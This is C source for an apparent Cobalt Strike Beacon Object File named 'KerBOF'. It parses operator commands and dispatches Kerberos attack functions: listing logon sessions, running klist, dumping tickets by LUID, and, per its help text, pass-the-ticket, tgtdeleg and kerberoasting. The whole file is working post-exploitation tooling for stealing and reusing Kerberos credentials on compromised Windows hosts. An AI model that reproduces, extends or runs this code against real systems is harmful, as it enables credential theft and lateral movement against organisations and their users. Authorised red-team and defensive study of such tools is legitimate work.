#include <windows.h> 
#include <stdio.h>
#include "beacon.h"
#include "bofdefs.h"
#include "common.c"
#include "luid.c"
#include "sessions.c"
//#include "purge.c"
#include "klist.c"
#include "base64.c"
#include "ptt.c"
//#include "krb5.c"
//#include "tgtdeleg.c"
//#include "kerberoast.c"

//void execute(WCHAR** dispatch, char* command, char* arg1, char* arg2, char* arg3, char* arg4);

void go(char* args, int length) {
//    BeaconPrintf(CALLBACK_OUTPUT, "args are: %s", args);

    datap parser;
    char* command;
    BeaconDataParse(&parser, args, length);

    command = BeaconDataExtract(&parser, NULL);

//    BeaconPrintf(CALLBACK_OUTPUT, "Command is: %s", command);

    if (command == NULL) {
        command = "";
    }
    char* arg1 = BeaconDataExtract(&parser, NULL);
    if (arg1 == NULL) {
        arg1 = "";
    }
    char* arg2 = BeaconDataExtract(&parser, NULL);
    if (arg2 == NULL) {
        arg2 = "";
    }
    char* arg3 = BeaconDataExtract(&parser, NULL);
    if (arg3 == NULL) {
        arg3 = "";
    }
    char* arg4 = BeaconDataExtract(&parser, NULL);
    if (arg4 == NULL) {
        arg4 = "";
    }
    execute(NULL, command, arg1, arg2, arg3, arg4);
}

void execute(WCHAR** dispatch, char* command, char* arg1, char* arg2, char* arg3, char* arg4) {
//    BeaconPrintf(CALLBACK_OUTPUT, "[+] Entered execute. Command is: %s", command);

    _CloseHandle MCloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "CloseHandle");
    _GetLastError MGetLastError = (_GetLastError)GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "GetLastError");

    if (MSVCRT$strcmp(command, "") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] I can't read your stupid command.\n");
        return;
    }

    LUID luid = (LUID){.HighPart = 0, .LowPart = 0};
    BOOL currentLuid = FALSE;
    HANDLE hToken = GetCurrentToken(TOKEN_QUERY);
    if (hToken == NULL) {
        PRINT(dispatch, "[!] Unable to query current token: %ld\n", MGetLastError());
        return;
    }

    if (MSVCRT$strcmp(command, "luid") == 0) {
        execute_luid(dispatch, hToken);
    } else if ((MSVCRT$strcmp(command, "sessions") == 0) || (MSVCRT$strcmp(command, "klist") == 0) ||
               (MSVCRT$strcmp(command, "dump") == 0)) {
        if (MSVCRT$strcmp(arg1, "") != 0) {
            if (MSVCRT$strcmp(arg1, "/luid") == 0) {
                if (MSVCRT$strcmp(arg2, "") != 0) {
                    luid.LowPart = MSVCRT$strtol(arg2, NULL, 16);
                    if (luid.LowPart == 0 || luid.LowPart == LONG_MAX || luid.LowPart == LONG_MIN) {
                        PRINT(dispatch, "[!] Specify valid /luid\n");
                        goto end;
                    }
                } else {
                    PRINT(dispatch, "[!] Specify /luid argument\n");
                    goto end;
                }
            } else if (MSVCRT$strcmp(arg1, "/all") == 0) {
        // Something with this luid literal is crashing it
                luid = (LUID){.HighPart = 0, .LowPart = 0};
                BeaconPrintf(CALLBACK_OUTPUT, "luid:  %lx:0x%lx", luid.HighPart, luid.LowPart);
            } else {
                PRINT(dispatch, "[!] Unknown command\n");
                goto end;
            }
        } else {
            LUID* cLuid = GetCurrentLUID(hToken);
            if (cLuid == NULL) {
                PRINT(dispatch, "[!] Unable to get current session LUID: %ld\n", MGetLastError());
                goto end;
            }
            luid.HighPart = cLuid->HighPart;
            luid.LowPart = cLuid->LowPart;
            currentLuid = TRUE;
            MSVCRT$free(cLuid);
        }

        if (MSVCRT$strcmp(command, "sessions") == 0) {
            execute_sessions(hToken, luid, currentLuid);
        } else if (MSVCRT$strcmp(command, "klist") == 0) {
            execute_klist(hToken, luid, currentLuid, FALSE);
        } else {
            execute_klist(hToken, luid, currentLuid, TRUE);
        }
    } 
      else if (MSVCRT$strcmp(command, "help") == 0) {
	  BeaconPrintf(CALLBACK_OUTPUT,
            "[*] KerBOF v0.1\n[***] Just So You Know:\n\n"
            "    luid\n"
            "    sessions [/luid <0x0> | /all]\n"
            "    klist    [/luid <0x0> | /all]\n"
            "    dump     [/luid <0x0> | /all]\n"
            "    ptt      <BASE64> [/luid <0x0>]\n"
            "    purge    [/luid <0x0>]\n"
            "    tgtdeleg <SPN>\n"
            "    kerberoast <SPN>\n\n"
            "    Encryption Reference List:\n"
            "\t des_cbc_crc                 = 1\n"
            "\tdes_cbc_md4                  = 2\n"
            "\tdes_cbc_md5                  = 3\n"
            "\tdes3_cbc_md5                 = 5\n"
            "\tdes3_cbc_sha1                = 7\n"
            "\tdsaWithSHA1_CmsOID           = 9\n"
            "\tmd5WithRSAEncryption_CmsOID  = 10\n"
            "\tsha1WithRSAEncryption_CmsOID = 11\n"
            "\trc2CBC_EnvOID                = 12\n"
            "\trsaEncryption_EnvOID         = 13\n"
            "\trsaES_OAEP_ENV_OID           = 14\n"
            "\tdes_ede3_cbc_Env_OID         = 15\n"
            "\tdes3_cbc_sha1_kd             = 16\n"
            "\taes128_cts_hmac_sha1         = 17\n"
            "\taes256_cts_hmac_sha1         = 18\n"
            "\trc4_hmac                     = 23\n"
            "\trc4_hmac_exp                 = 24\n"
            "\tsubkey_keymaterial           = 65\n"
            "\told_exp                      = -135\n");
    } else {
        PRINT(dispatch, "[!] Unknown command.\n");
    }
end:
    MCloseHandle(hToken);
}
